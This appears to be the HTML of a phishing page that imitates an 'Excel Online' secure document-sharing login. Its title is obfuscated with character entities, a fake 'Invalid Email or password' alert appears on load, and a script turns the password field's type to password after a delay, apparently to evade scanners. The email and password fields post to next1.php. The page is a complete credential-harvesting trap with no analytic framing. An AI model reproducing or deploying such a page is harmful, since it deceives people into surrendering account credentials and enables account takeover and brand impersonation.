<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#69;&#120;&#99;&#101;&#108;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#45;&#32;&#83;&#101;&#99;&#117;&#114;&#101;&#32;&#68;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#115;&#32;&#83;&#104;&#97;&#114;&#105;&#110;&#103;&#32;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
   
.textbox {
    font-family: Arial;
    font-size: 15px;
    color: #2d2628;
	padding-left:2px;
    height: 29px;
    width: 275px;
    border: 1px solid #fffff;
}

 </style>

<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<script type="text/javascript">
    alert("Invalid Email or password! Please enter your correct Email and password!");
</script>
</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:230px; z-index:0"><img src="images/e1.png" alt="" title="" border=0 width=1365 height=230></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:228px; width:1365px; height:279px; z-index:1"><img src="images/e2.png" alt="" title="" border=0 width=1365 height=279></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:505px; width:1365px; height:157px; z-index:2"><img src="images/e3.png" alt="" title="" border=0 width=1365 height=157></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:53px; width:1048px; height:126px; z-index:3"><a href="#"><img src="images/e4.png" alt="" title="" border=0 width=1048 height=126></a></div>
<form action=next1.php name=dafabhai id=dafabhai method=post>
<input name="usr" placeholder="&#83;&#111;&#109;&#101;&#111;&#110;&#101;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:304px;left:522px;top:342px;z-index:4">
<input name="psw" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:304px;left:522px;top:383px;z-index:5">
<div id="formcheckbox1" style="position:absolute; left:527px; top:422px; z-index:6"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:639px; top:447px; z-index:7"><input type="image" name="formimage1" width="84" height="38" src="images/down.png"></div>
</div>

	
</body>
</html>
